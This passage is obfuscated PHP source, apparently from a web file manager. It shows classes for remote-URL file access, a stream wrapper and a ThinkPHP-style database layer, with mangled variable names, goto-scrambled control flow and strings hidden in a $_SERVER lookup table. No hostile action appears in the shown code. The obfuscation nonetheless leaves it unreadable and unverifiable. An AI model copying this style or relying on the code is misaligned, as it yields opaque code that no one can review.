isset($fï¼‘œ©Œ„[$C»ø¶Õ¢Ü±[196]]) ? $fï¼‘œ©Œ„[$C»ø¶Õ¢Ü±[196]] : !1; } public function size($fÒßë›â¹‹) { $AÛºÖò­ŸÈ = $this->objectMeta($fÒßë›â¹‹); return $AÛºÖò­ŸÈ ? $AÛºÖò­ŸÈ[$_SERVER[‚Ğ°–—î][77]] : 0; } public function info($e˜†Âçç‹à) { if ($this->isFolder($e˜†Âçç‹à)) { return $this->folderInfo($e˜†Âçç‹à); } else { if ($this->isFile($e˜†Âçç‹à)) { return $this->fileInfo($e˜†Âçç‹à); } } return !1; } public function exist($Cñò÷î×–‚) { return $this->isFile($Cñò÷î×–‚) || $this->isFolder($Cñò÷î×–‚); } public function isFile($D¿•áà–ù) { return !$this->isFolder($D¿•áà–ù) && $this->objectMeta($D¿•áà–ù); } public function isFolder($bÉÊáÂœ¨) { return $this->cacheMethod($_SERVER[‚Ğ°–—î][223], $bÉÊáÂœ¨); } protected function objectMeta($c—ìøÚ÷÷‰) { return $this->cacheMethod($_SERVER[‚Ğ°–—î][224], $c—ìøÚ÷÷‰); } protected function _objectMeta($Aá°¡š×óÖ) { goto dßœÍÉÒ¨›; e¨…ƒ´ÌÊ: $F¥ì¶ñÏæ† = array($F§©ä²Ë›[28] => get_path_this($Aá°¡š×óÖ), $F§©ä²Ë›[29] => isset($e±­°Šà¿[$F§©ä²Ë›[1283]]) ? $e±­°Šà¿[$F§©ä²Ë›[1283]] : null, $F§©ä²Ë›[77] => isset($e±­°Šà¿[$F§©ä²Ë›[1284]]) ? $e±­°Šà¿[$F§©ä²Ë›[1284]] : null, $F§©ä²Ë›[196] => isset($e±­°Šà¿[$F§©ä²Ë›[1285]]) ? $e±­°Šà¿[$F§©ä²Ë›[1285]] : null, $F§©ä²Ë›[1253] => isset($e±­°Šà¿[$F§©ä²Ë›[1286]]) ? $e±­°Šà¿[$F§©ä²Ë›[1286]] : null); $F¥ì¶ñÏæ†[$F§©ä²Ë›[1254]] = isset($e±­°Šà¿[$F§©ä²Ë›[1287]]) ? strtotime($e±­°Šà¿[$F§©ä²Ë›[1287]]) : $F¥ì¶ñÏæ†[$F§©ä²Ë›[1253]]; return $F¥ì¶ñÏæ†; goto E©•‰æò·§; dßœÍÉÒ¨›: $F§©ä²Ë› =& $_SERVER[‚Ğ°–—î]; if ($Aá°¡š×óÖ == $F§©ä²Ë›[33] || $Aá°¡š×óÖ == $F§©ä²Ë›[8]) { return array(); } $DÜ·“ö¢ = $this->ussRequest($Aá°¡š×óÖ, $F§©ä²Ë›[1282]); goto bÂ½éŸ²·‚; bÂ½éŸ²·‚: if (!$DÜ·“ö¢[$F§©ä²Ë›[1033]]) { return null; } $e±­°Šà¿ = isset($DÜ·“ö¢[$F§©ä²Ë›[1035]]) ? $DÜ·“ö¢[$F§©ä²Ë›[1035]] : array(); if (!isset($e±­°Šà¿[$F§©ä²Ë›[1283]])) { return null; } goto e¨…ƒ´ÌÊ; E©•‰æò·§: } protected function _isFolder($CŒ£Ò­¹àÛ) { $e†ˆ²¾ËÂ =& $_SERVER[‚Ğ°–—î]; if ($CŒ£Ò­¹àÛ == $e†ˆ²¾ËÂ[33] || $CŒ£Ò­¹àÛ == $e†ˆ²¾ËÂ[8]) { return !0; } $bÁáğÓ© = $this->objectMeta($CŒ£Ò­¹àÛ); return isset($bÁáğÓ©[$e†ˆ²¾ËÂ[29]]) && $bÁáğÓ©[$e†ˆ²¾ËÂ[29]] == $e†ˆ²¾ËÂ[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($DÍÍÊŠÓ = false) { } public function exist($bÖÉæ†‚¨·) { $EùŞÊˆ¦ = $this->info($bÖÉæ†‚¨·); return $EùŞÊˆ¦[$_SERVER[‚Ğ°–—î][188]]; } public function isFile($Cô‰˜‘âñå) { $CËËÊÇË´Š = $this->info($Cô‰˜‘âñå); return $CËËÊÇË´Š[$_SERVER[‚Ğ°–—î][188]]; } public function isFolder($eºÁÂÁ±) { return !1; } public function size($DĞ®®ÚùÁ¸) { $aÏÁ”¢ƒ“« = $this->info($DĞ®®ÚùÁ¸); return $aÏÁ”¢ƒ“«[$_SERVER[‚Ğ°–—î][77]]; } public function info($F¯·¿®¹¦¥) { return $this->infoParse($F¯·¿®¹¦¥); } public function infoAuth($e™„ï è) { return $this->infoParse($e™„ï è); } public function infoWithChildren($bÄ•ÙÄõ°—) { return $this->infoParse($bÄ•ÙÄõ°—); } public function infoFull($f¬·Ğà†) { return $this->infoParse($f¬·Ğà†); } private function infoParse($eÏš‚²éŒ½) { $CâÑœ²¿» =& $_SERVER[‚Ğ°–—î]; $C‰»ß™òÙ = $this->header($eÏš‚²éŒ½); if (!$C‰»ß™òÙ || !$C‰»ß™òÙ[$CâÑœ²¿»[688]]) { return !1; } $C“©äŠáŸ = _get($C‰»ß™òÙ, $CâÑœ²¿»[325], 0); $fæ†‰÷®µ = array($CâÑœ²¿»[28] => $C‰»ß™òÙ[$CâÑœ²¿»[28]], $CâÑœ²¿»[75] => $eÏš‚²éŒ½, $CâÑœ²¿»[29] => $CâÑœ²¿»[167], $CâÑœ²¿»[77] => intval($C“©äŠáŸ), $CâÑœ²¿»[160] => get_path_ext($C‰»ß™òÙ[$CâÑœ²¿»[28]]), $CâÑœ²¿»[1162] => $C“©äŠáŸ > 0 && $C‰»ß™òÙ[$CâÑœ²¿»[1288]], $CâÑœ²¿»[1163] => !1); return $fæ†‰÷®µ; } private function header($eøÏˆ‚½³Œ) { if (isset(self::$_cacheHeader[$eøÏˆ‚½³Œ])) { return self::$_cacheHeader[$eøÏˆ‚½³Œ]; } self::$_cacheHeader[$eøÏˆ‚½³Œ] = url_header($eøÏˆ‚½³Œ); return self::$_cacheHeader[$eøÏˆ‚½³Œ]; } public function hashSimple($eÍ ŠØ˜¹ñ, $cØ¤É”Ë“„ = false) { goto D»ÛÈŒ½¯Ü; D»ÛÈŒ½¯Ü: $F¨ ªïîµ¼ =& $_SERVER[‚Ğ°–—î]; $aµº·õä± = $this->info($eÍ ŠØ˜¹ñ); if (!$aµº·õä± || !$aµº·õä±[$F¨ ªïîµ¼[188]]) { return !1; } goto A˜²¥ÅÙ; f×§éƒŒ•†: if ($f„¦ŒÎíÅ <= $FÌ…ê—¼“ * $cîîÆ¥¾“) { return md5($this->fileSubstr($eÍ ŠØ˜¹ñ, 0, $f„¦ŒÎíÅ)) . $f„¦ŒÎíÅ; } $AĞã›Íç£È = intval($f„¦ŒÎíÅ / $cîîÆ¥¾“); $f¬ğŞãÖÔÎ = $F¨ ªïîµ¼[33]; goto bø„Üùì¥; A ¶Œ¶§: $f¬ğŞãÖÔÎ .= $this->fileSubstr($eÍ ŠØ˜¹ñ, $f„¦ŒÎíÅ - $FÌ…ê—¼“, $FÌ…ê—¼“); return md5($f¬ğŞãÖÔÎ) . $f„¦ŒÎíÅ; goto E¡»Ş”®ï; A˜²¥ÅÙ: $f„¦ŒÎíÅ = $aµº·õä±[$F¨ ªïîµ¼[77]]; $FÌ…ê—¼“ = 200; $cîîÆ¥¾“ = 50; goto f×§éƒŒ•†; bø„Üùì¥: $Bí¶ßÚ„—ï = timeFloat(); $fºöÜÓ¼ÌĞ = 15; for ($Bº‰ç»‚ÓØ = 0; $Bº‰ç»‚ÓØ < $cîîÆ¥¾“; $Bº‰ç»‚ÓØ++) { if (timeFloat() - $Bí¶ßÚ„—ï > $fºöÜÓ¼ÌĞ) { return !1; } $BÒƒİ¬Ô©’ = $this->fileSubstr($eÍ ŠØ˜¹ñ, $AĞã›Íç£È * $Bº‰ç»‚ÓØ, $FÌ…ê—¼“); if (!$BÒƒİ¬Ô©’) { return !1; } $f¬ğŞãÖÔÎ .= $BÒƒİ¬Ô©’; } goto A ¶Œ¶§; E¡»Ş”®ï: } public function getContent($AÈÊÒ©ó„Ğ) { return $this->fileSubstr($AÈÊÒ©ó„Ğ); } public function fileSubstr($fâ„È½ÀòÔ, $bĞá–Ô˜ˆ = 0, $F• °†•„ = -1) { goto aõå–‡ª¬; C®°‚ÆÆå¦: if ($F• °†•„ === -1) { $F• °†•„ = $cŒñø²ªö±[$Bß¼ÑÖ‰çÊ[77]]; } if ($F• °†•„ == 0) { return $Bß¼ÑÖ‰çÊ[33]; } $F©œò¶… = array($Bß¼ÑÖ‰çÊ[1289] . $bĞá–Ô˜ˆ . $Bß¼ÑÖ‰çÊ[715] . ($bĞá–Ô˜ˆ + $F• °†•„ - 1)); goto B¢‰£Æà¸·; aõå–‡ª¬: $Bß¼ÑÖ‰çÊ =& $_SERVER[‚Ğ°–—î]; $cŒñø²ªö± = $this->info($fâ„È½ÀòÔ); if (!$cŒñø²ªö± || !$cŒñø²ªö±[$Bß¼ÑÖ‰çÊ[188]] && $cŒñø²ªö±[$Bß¼ÑÖ‰çÊ[77]] > 1024 * 1024 * 10) { return !1; } goto C®°‚ÆÆå¦; B¢‰£Æà¸·: $B‘áÇî©Œ¾ = url_request($fâ„È½ÀòÔ, $Bß¼ÑÖ‰çÊ[216], !1, $F©œò¶…, !1, !1, 1); return $B‘áÇî©Œ¾[$Bß¼ÑÖ‰çÊ[1035]] ? $B‘áÇî©Œ¾[$Bß¼ÑÖ‰çÊ[1035]] : $Bß¼ÑÖ‰çÊ[33]; goto DŠ„Éƒâ‡; DŠ„Éƒâ‡: } public function download($b»ĞŸïï‚, $F®ô‹¢ÇÚ) { Downloader::start($b»ĞŸïï‚, $F®ô‹¢ÇÚ); return $F®ô‹¢ÇÚ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($D³–µàÄ…§, $F…æ¢›ì© = '') { goto fÖâåÓ‹¢Œ; fÖâåÓ‹¢Œ: $this->info = $this->info($D³–µàÄ…§); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[‚Ğ°–—î][75]]; goto eĞÀ ‰ãŞ›; eĞÀ ‰ãŞ›: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$D³–µàÄ…§])) { self::$_chunkBuffer[$D³–µàÄ…§] = array(); } goto bë“˜—å‚š; bë“˜—å‚š: return $this->info ? !0 : !1; goto cƒ¡ÏƒÅ’; cƒ¡ÏƒÅ’: } function stream_read($cˆÕ †) { $Eè©œàìË = $this->fileSubstr($this->pose, $cˆÕ †); $this->pose += strlen($Eè©œàìË); return $Eè©œàìË; } public function stream_tell() { return $this->pose; } public function stream_seek($eİí‡Î±–Ë, $cï˜ÓÓÀ˜¼) { $a¤œ²¢½ß‹ =& $_SERVER[‚Ğ°–—î]; if ($cï˜ÓÓÀ˜¼ == SEEK_SET) { $this->pose = $eİí‡Î±–Ë; } else { if ($cï˜ÓÓÀ˜¼ == SEEK_CUR) { $this->pose += $eİí‡Î±–Ë; } else { if ($cï˜ÓÓÀ˜¼ == SEEK_END) { $this->pose = $this->info[$a¤œ²¢½ß‹[77]] + intval($eİí‡Î±–Ë); } } } if ($eİí‡Î±–Ë < 0) { $this->pose = $this->info[$a¤œ²¢½ß‹[77]] + $eİí‡Î±–Ë; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[‚Ğ°–—î][77]]; } public function stream_close() { return !0; } public function url_stat($BœÖ›Ø…‚®, $A‡—©çÒæè) { $c‹šÕò·¿ =& $_SERVER[‚Ğ°–—î]; $cÈ÷–âÅ‡³ = $this->info($BœÖ›Ø…‚®); return array($c‹šÕò·¿[1290] => 0, $c‹šÕò·¿[1291] => 0, $c‹šÕò·¿[12] => 32768 + 511, $c‹šÕò·¿[1292] => 0, $c‹šÕò·¿[1293] => 0, $c‹šÕò·¿[1294] => 0, $c‹šÕò·¿[1295] => 0, $c‹šÕò·¿[77] => $cÈ÷–âÅ‡³[$c‹šÕò·¿[77]], $c‹šÕò·¿[1296] => $cÈ÷–âÅ‡³[$c‹šÕò·¿[1168]], $c‹šÕò·¿[1254] => $cÈ÷–âÅ‡³[$c‹šÕò·¿[107]], $c‹šÕò·¿[1253] => $cÈ÷–âÅ‡³[$c‹šÕò·¿[187]], $c‹šÕò·¿[1297] => 0, $c‹šÕò·¿[1298] => 0); } static $fileInfo = array(); public function info($DË‹ã§Ñ˜™) { $EÑ•ïŠÑ¯÷ = $_SERVER[‚Ğ°–—î][1299]; if (isset(self::$fileInfo[$DË‹ã§Ñ˜™])) { return self::$fileInfo[$DË‹ã§Ñ˜™]; } if (substr($DË‹ã§Ñ˜™, 0, strlen($EÑ•ïŠÑ¯÷)) != $EÑ•ïŠÑ¯÷) { return !1; } self::$fileInfo[$DË‹ã§Ñ˜™] = IO::info(substr($DË‹ã§Ñ˜™, strlen($EÑ•ïŠÑ¯÷))); return self::$fileInfo[$DË‹ã§Ñ˜™]; } public static function read($CÁ¶¡¼¥‚Ñ, $b§¢Ô…«ÜË, $BÕ‹©†¸˜è) { goto cªÒÀïˆµ; cªÒÀïˆµ: $EÃ²®É‚Û× =& $_SERVER[‚Ğ°–—î]; $E‹¬êÏñ…Ê = fopen($CÁ¶¡¼¥‚Ñ, $EÃ²®É‚Û×[1170]); if (!$E‹¬êÏñ…Ê) { return $EÃ²®É‚Û×[33]; } goto cóÁ¤ÑÏ…; D…¾ˆ¨¾‚°: return $f â©¼…Ğ; goto F÷§·»øŞ; cóÁ¤ÑÏ…: $eÅÚåê÷¦ = 8192; fseek($E‹¬êÏñ…Ê, $b§¢Ô…«ÜË, SEEK_SET); $f â©¼…Ğ = $EÃ²®É‚Û×[33]; goto b£éˆ¿™ˆ; b£éˆ¿™ˆ: $EšÌòŒâ† = 0; while ($EšÌòŒâ† < $BÕ‹©†¸˜è) { $cŒ‡ÂÇ‚ù¤ = min($eÅÚåê÷¦, $BÕ‹©†¸˜è - $EšÌòŒâ†); $f â©¼…Ğ .= fread($E‹¬êÏñ…Ê, $cŒ‡ÂÇ‚ù¤); $EšÌòŒâ† += $cŒ‡ÂÇ‚ù¤; } fclose($E‹¬êÏñ…Ê); goto D…¾ˆ¨¾‚°; F÷§·»øŞ: } public function fileSubstr($eÌŒĞ§Ê½¦, $eèÛó±Ë„™) { goto F¥ÒŠ; a“‡õ¨¨‹Î: $fß‡Õğ‡ÕŠ = 64 * 1024; $cãôšøÉŠ„ =& self::$_chunkBuffer[$this->path]; if (!$cãôšøÉŠ„) { $cãôšøÉŠ„ = array(); } goto cî¿Ş¼ì©; C‚¹ÏÜ™: $FáÄ†Õ“® = ceil(($eÌŒĞ§Ê½¦ + $eèÛó±Ë„™) / $fß‡Õğ‡ÕŠ) * $fß‡Õğ‡ÕŠ - $aŞ¾”œˆß; $E›‘øš¼­¨ = IO::fileSubstr($this->path, $aŞ¾”œˆß, $FáÄ†Õ“®); $cãôšøÉŠ„[$aŞ¾”œˆß . $e†èÛÛ¦Ğë[33]] = $E›‘øš¼­¨; goto dîØÍ‡’„‡; cî¿Ş¼ì©: $ašÒƒ ÂÏÈ = 0; $aöº«µÑªß = 0; $dÉ‡Î¸ìÚ¶ = $e†èÛÛ¦Ğë[33]; goto dáì£ã‘; dîØÍ‡’„‡: ksort($cãôšøÉŠ„); $f¹ó‡Ş Õ¿ = substr($E›‘øš¼­¨, $eÌŒĞ§Ê½¦ - $aŞ¾”œˆß, $eèÛó±Ë„™); return $f¹ó‡Ş Õ¿; goto cÚŒô¬‹ôÙ; Cšµè”¾ÉÓ: $bæôµàˆó» = $eèÛó±Ë„™; if ($eÌŒĞ§Ê½¦ < 0) { $eÌŒĞ§Ê½¦ = $a¥àÕˆ‰ + $eÌŒĞ§Ê½¦; } if ($eèÛó±Ë„™ === !1) { $eèÛó±Ë„™ = $a¥àÕˆ‰ - $eÌŒĞ§Ê½¦; } goto A°ÌÕ’Â; F¥ÒŠ: $e†èÛÛ¦Ğë =& $_SERVER[‚Ğ°–—î]; $a¥àÕˆ‰ = $this->info[$e†èÛÛ¦Ğë[77]]; $Cä¢è´¸ø› = $eÌŒĞ§Ê½¦; goto Cšµè”¾ÉÓ; A°ÌÕ’Â: if ($eÌŒĞ§Ê½¦ + $eèÛó±Ë„™ > $a¥àÕˆ‰) { $eèÛó±Ë„™ = $a¥àÕˆ‰ - $eÌŒĞ§Ê½¦; } if ($eèÛó±Ë„™ <= 0) { return $e†èÛÛ¦Ğë[33]; } if ($eÌŒĞ§Ê½¦ < 0 || $eÌŒĞ§Ê½¦ >= $a¥àÕˆ‰ || $eèÛó±Ë„™ <= 0 || $eèÛó±Ë„™ > 1024 * 1024 * 5) { throw new Exception("\x69\157\x46\x69\154\x65\122\145\x61\144\40\145\x72\162\x6f\162\x21\x20\163\164\x61\162\x74\x3d{$eÌŒĞ§Ê½¦}\73\x6c\145\156\x67\164\x68\x3d{$eèÛó±Ë„™}\73\x20\163\151\172\x65\75{$a¥àÕˆ‰}\73"); } goto a“‡õ¨¨‹Î; dáì£ã‘: foreach ($cãôšøÉŠ„ as $ašÒƒ ÂÏÈ => $dÉ‡Î¸ìÚ¶) { $ašÒƒ ÂÏÈ = intval($ašÒƒ ÂÏÈ); $aöº«µÑªß = $ašÒƒ ÂÏÈ + strlen($dÉ‡Î¸ìÚ¶); if ($eÌŒĞ§Ê½¦ >= $aöº«µÑªß) { continue; } if ($eÌŒĞ§Ê½¦ >= $ašÒƒ ÂÏÈ && $eÌŒĞ§Ê½¦ + $eèÛó±Ë„™ <= $aöº«µÑªß) { return substr($dÉ‡Î¸ìÚ¶, $eÌŒĞ§Ê½¦ - $ašÒƒ ÂÏÈ, $eèÛó±Ë„™); } break; } if (count($cãôšøÉŠ„) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($e†èÛÛ¦Ğë[1300], $e†èÛÛ¦Ğë[1301] . count($cãôšøÉŠ„) . "\x3b\x73\164\x61\x72\x74\75{$eÌŒĞ§Ê½¦}\54\154\x65\156\x67\164\x68\x3d{$eèÛó±Ë„™}\73\x70\157\x73\145\x3a{$ašÒƒ ÂÏÈ}\x7e{$aöº«µÑªß}"); throw new Exception($e†èÛÛ¦Ğë[1302]); } $aŞ¾”œˆß = intval($eÌŒĞ§Ê½¦ / $fß‡Õğ‡ÕŠ) * $fß‡Õğ‡ÕŠ; goto C‚¹ÏÜ™; cÚŒô¬‹ôÙ: } private function log($F¡À©ÀäÙë, $e…öÏ“¸İæ) { $dÜÅ§„„ùê =& $_SERVER[‚Ğ°–—î]; $F«éÅ›•Ğ‡ = timeFloat() - $this->timeStart; write_log(sprintf($dÜÅ§„„ùê[1303], $F¡À©ÀäÙë, $this->info[$dÜÅ§„„ùê[28]], $F«éÅ›•Ğ‡, $e…öÏ“¸İæ), $dÜÅ§„„ùê[1219]); } } goto Aœ¬šä‚; e™°¢™ùÔù: define($_SERVER[‚Ğ°–—î][1935], 3); define($_SERVER[‚Ğ°–—î][1936], 4); define($_SERVER[‚Ğ°–—î][1937], 5); goto Aââğ‹¯øõ; f¨êÏù¶¸ˆ: register_shutdown_function($_SERVER[ú][36]); set_error_handler($_SERVER[ú][49], $d„í ¸âĞ); if (function_exists($_SERVER[ú][50])) { set_exception_handler($_SERVER[ú][51]); } goto cóëæ¼Üµ; FÂè±ºë•‡: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\151\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\x3d", "\156\x65\161" => "\x3c\76", "\x67\x74" => "\x3e", "\x65\147\x74" => "\76\75", "\x6c\164" => "\x3c", "\145\x6c\164" => "\x3c\75", "\x6e\x6f\164\154\151\153\x65" => "\x4e\x4f\124\40\x4c\x49\x4b\105", "\x6c\151\153\x65" => "\x4c\111\x4b\105", "\x69\x6e" => "\x49\116", "\x6e\x6f\x74\151\x6e" => "\116\117\124\x20\111\x4e", "\156\x6f\164\x20\151\x6e" => "\116\x4f\x54\x20\x49\x4e", "\x62\145\164\x77\x65\x65\x6e" => "\x42\x45\x54\x57\105\105\x4e", "\156\x6f\164\x62\145\164\x77\x65\x65\x6e" => "\116\x4f\x54\40\x42\105\124\127\x45\x45\x4e", "\156\x6f\x74\40\142\x65\x74\x77\145\x65\x6e" => "\x4e\x4f\124\x20\x42\x45\x54\x57\x45\x45\x4e"); protected $selectSql = "\123\105\x4c\x45\103\124\x25\104\111\123\x54\x49\116\103\124\x25\40\45\106\111\x45\x4c\x44\45\x20\106\x52\117\115\x20\45\x54\x41\102\114\105\x25\45\112\x4f\111\x4e\45\x25\127\110\x45\122\x45\x25\45\x47\x52\x4f\x55\120\x25\45\110\101\x56\x49\116\x47\45\45\x4f\x52\x44\x45\x52\x25\45\x4c\111\x4d\111\124\x25\40\x25\125\x4e\x49\117\116\45\45\x43\117\115\115\105\116\124\x25"; protected $bind = array(); public static function getInstance() { $cÛ ùˆ²‡² = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[‚Ğ°–—î][876], $cÛ ùˆ²‡²); } public function factory($c’ …ŠŞ²ô = '') { goto Eµ†œÍ†’; E³’ª—ÍŒ“: return $dôš‡Ó¶œç; goto ağŠÖÄÅ‰ê; Eµ†œÍ†’: $fœ©Ñ´™° =& $_SERVER[‚Ğ°–—î]; $c’ …ŠŞ²ô = $this->parseConfig($c’ …ŠŞ²ô); if (empty($c’ …ŠŞ²ô[$fœ©Ñ´™°[877]])) { think_exception(think_lang($fœ©Ñ´™°[878])); } goto EÃ½ç¬„‘¬; EÃ½ç¬„‘¬: $this->dbType = ucwords(strtolower($c’ …ŠŞ²ô[$fœ©Ñ´™°[877]])); $f®Â¡Ë†ˆ = $fœ©Ñ´™°[879] . $this->dbType; if (class_exists($f®Â¡Ë†ˆ)) { $dôš‡Ó¶œç = new $f®Â¡Ë†ˆ($c’ …ŠŞ²ô); if ($fœ©Ñ´™°[723] != strtolower($c’ …ŠŞ²ô[$fœ©Ñ´™°[877]])) { $dôš‡Ó¶œç->dbType = strtoupper($this->dbType); } else { $dôš‡Ó¶œç->dbType = $this->_getDsnType($c’ …ŠŞ²ô[$fœ©Ñ´™°[828]]); } } else { think_exception(think_lang($fœ©Ñ´™°[880]) . $fœ©Ñ´™°[881] . $f®Â¡Ë†ˆ); } goto E³’ª—ÍŒ“; ağŠÖÄÅ‰ê: } public function __call($f®©âÕ°’, $b©ç­öÍ¿Ğ) { if (method_exists($this, $f®©âÕ°’)) { return call_user_func_array(array($this, $f®©âÕ°’), $b©ç­öÍ¿Ğ); } } protected function _getDsnType($DÂœ³ÜØµ) { $CË“ËğÖ¥ = explode($_SERVER[‚Ğ°–—î][4], $DÂœ³ÜØµ); $A‹©¼§¹¯ä = strtoupper(trim($CË“ËğÖ¥[0])); return $A‹©¼§¹¯ä; } private function parseConfig($ağêˆÍ¼³· = '') { $BçÚ»Ô»Ô² =& $_SERVER[‚Ğ°–—î]; if (!empty($ağêˆÍ¼³·) && is_string($ağêˆÍ¼³·)) { $ağêˆÍ¼³· = $this->parseDSN($ağêˆÍ¼³·); } elseif (is_array($ağêˆÍ¼³·)) { $ağêˆÍ¼³· = array_change_key_case($ağêˆÍ¼³·); $ağêˆÍ¼³· = array($BçÚ»Ô»Ô²[877] => $ağêˆÍ¼³·[$BçÚ»Ô»Ô²[722]], $BçÚ»Ô»Ô²[801] => $ağêˆÍ¼³·[$BçÚ»Ô»Ô²[882]], $BçÚ»Ô»Ô²[802] => $ağêˆÍ¼³·[$BçÚ»Ô»Ô²[883]], $BçÚ»Ô»Ô²[799] => $ağêˆÍ¼³·[$BçÚ»Ô»Ô²[884]], $BçÚ»Ô»Ô²[800] => $ağêˆÍ¼³·[$BçÚ»Ô»Ô²[885]], $BçÚ»Ô»Ô²[17] => $ağêˆÍ¼³·[$BçÚ»Ô»Ô²[886]], $BçÚ»Ô»Ô²[828] => $ağêˆÍ¼³·[$BçÚ»Ô»Ô²[724]], $BçÚ»Ô»Ô²[13] => isset($ağêˆÍ¼³·[$BçÚ»Ô»Ô²[887]]) ? $ağêˆÍ¼³·[$BçÚ»Ô»Ô²[887]] : array()); } elseif (empty($ağêˆÍ¼³·)) { if (think_config($BçÚ»Ô»Ô²[888]) && $BçÚ»Ô»Ô²[723] != strtolower(think_config($BçÚ»Ô»Ô²[889]))) { $ağêˆÍ¼³· = $this->parseDSN(think_config($BçÚ»Ô»Ô²[888])); } else { $ağêˆÍ¼³· = array($BçÚ»Ô»Ô²[877] => think_config($BçÚ»Ô»Ô²[889]), $BçÚ»Ô»Ô²[801] => think_config($BçÚ»Ô»Ô²[890]), $BçÚ»Ô»Ô²[802] => think_config($BçÚ»Ô»Ô²[891]), $BçÚ»Ô»Ô²[799] => think_config($BçÚ»Ô»Ô²[892]), $BçÚ»Ô»Ô²[800] => think_config($BçÚ»Ô»Ô²[893]), $BçÚ»Ô»Ô²[17] => think_config($BçÚ»Ô»Ô²[234]), $BçÚ»Ô»Ô²[828] => think_config($BçÚ»Ô»Ô²[888]), $BçÚ»Ô»Ô²[13] => think_config($BçÚ»Ô»Ô²[894])); } } return $ağêˆÍ¼³·; } protected function initConnect($c©…Éï×‚ = true) { if (1 == think_config($_SERVER[‚Ğ°–—î][18])) { $this->_linkID = $this->multiConnect($c©…Éï×‚); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($D‹Ø½’‰‘ø = false) { $A¶–ÍîàŠ =& $_SERVER[‚Ğ°–—î]; static $Bß¿»ø§Ì© = array(); if (empty($Bß¿»ø§Ì©)) { foreach ($this->config as $E³¾ÈÄ¶‡Ô => $CŒ ‰ÈÉÖô) { $Bß¿»ø§Ì©[$E³¾ÈÄ¶‡Ô] = explode($A¶–ÍîàŠ[47], $CŒ ‰ÈÉÖô); } } if (think_config($A¶–ÍîàŠ[895])) { if ($D‹Ø½’‰‘ø) { $eÅÉëôÖˆè = floor(mt_rand(0, think_config($A¶–ÍîàŠ[896]) - 1)); } else { if (is_numeric(think_config($A¶–ÍîàŠ[897]))) { $eÅÉëôÖˆè = think_config($A¶–ÍîàŠ[897]); } else { $eÅÉëôÖˆè = floor(mt_rand(think_config($A¶–ÍîàŠ[896]), count($Bß¿»ø§Ì©[$A¶–ÍîàŠ[799]]) - 1)); } } } else { $eÅÉëôÖˆè = floor(mt_rand(0, count($Bß¿»ø§Ì©[$A¶–ÍîàŠ[799]]) - 1)); } $B‘£ëÒµâ = array($A¶–ÍîàŠ[801] => isset($Bß¿»ø§Ì©[$A¶–ÍîàŠ[801]][$eÅÉëôÖˆè]) ? $Bß¿»ø§Ì©[$A¶–ÍîàŠ[801]][$eÅÉëôÖˆè] : $Bß¿»ø§Ì©[$A¶–ÍîàŠ[801]][0], $A¶–ÍîàŠ[802] => isset($Bß¿»ø§Ì©[$A¶–ÍîàŠ[802]][$eÅÉëôÖˆè]) ? $Bß¿»ø§Ì©[$A¶–ÍîàŠ[802]][$eÅÉëôÖˆè] : $Bß¿»ø§Ì©[$A¶–ÍîàŠ[802]][0], $A¶–ÍîàŠ[799] => isset($Bß¿»ø§Ì©[$A¶–ÍîàŠ[799]][$eÅÉëôÖˆè]) ? $Bß¿»ø§Ì©[$A¶–ÍîàŠ[799]][$eÅÉëôÖˆè] : $Bß¿»ø§Ì©[$A¶–ÍîàŠ[799]][0], $A¶–ÍîàŠ[800] => isset($Bß¿»ø§Ì©[$A¶–ÍîàŠ[800]][$eÅÉëôÖˆè]) ? $Bß¿»ø§Ì©[$A¶–ÍîàŠ[800]][$eÅÉëôÖˆè] : $Bß¿»ø§Ì©[$A¶–ÍîàŠ[800]][0], $A¶–ÍîàŠ[17] => isset($Bß¿»ø§Ì©[$A¶–ÍîàŠ[17]][$eÅÉëôÖˆè]) ? $Bß¿»ø§Ì©[$A¶–ÍîàŠ[17]][$eÅÉëôÖˆè] : $Bß¿»ø§Ì©[$A¶–ÍîàŠ[17]][0], $A¶–ÍîàŠ[828] => isset($Bß¿»ø§Ì©[$A¶–ÍîàŠ[828]][$eÅÉëôÖˆè]) ? $Bß¿»ø§Ì©[$A¶–ÍîàŠ[828]][$eÅÉëôÖˆè] : $Bß¿»ø§Ì©[$A¶–ÍîàŠ[828]][0], $A¶–ÍîàŠ[13] => isset($Bß¿»ø§Ì©[$A¶–ÍîàŠ[13]][$eÅÉëôÖˆè]) ? $Bß¿»ø§Ì©[$A¶–ÍîàŠ[13]][$eÅÉëôÖˆè] : $Bß¿»ø§Ì©[$A¶–ÍîàŠ[13]][0]); return $this->connect($B‘£ëÒµâ, $eÅÉëôÖˆè); } public function parseDSN($d©ÅÎéïœ±) { $B“¹ÜÂ¹…† =& $_SERVER[‚Ğ°–—î]; if (empty($d©ÅÎéïœ±)) { return !1; } $d×Ä©à— = parse_url($d©ÅÎéïœ±); if ($d×Ä©à—[$B“¹ÜÂ¹…†[168]]) { $AƒÂÑ¶Ô = array($B“¹ÜÂ¹…†[877] => $d×Ä©à—[$B“¹ÜÂ¹…†[168]], $B“¹ÜÂ¹…†[801] => isset($d×Ä©à—[$B“¹ÜÂ¹…†[535]]) ? $d×Ä©à—[$B“¹ÜÂ¹…†[535]] : $B“¹ÜÂ¹…†[33], $B“¹ÜÂ¹…†[802] => isset($d×Ä©à—[$B“¹ÜÂ¹…†[898]]) ? $d×Ä©à—[$B“¹ÜÂ¹…†[898]] : $B“¹ÜÂ¹…†[33], $B“¹ÜÂ¹…†[799] => isset($d×Ä©à—[$B“¹ÜÂ¹…†[169]]) ? $d×Ä©à—[$B“¹ÜÂ¹…†[169]] : $B“¹ÜÂ¹…†[33], 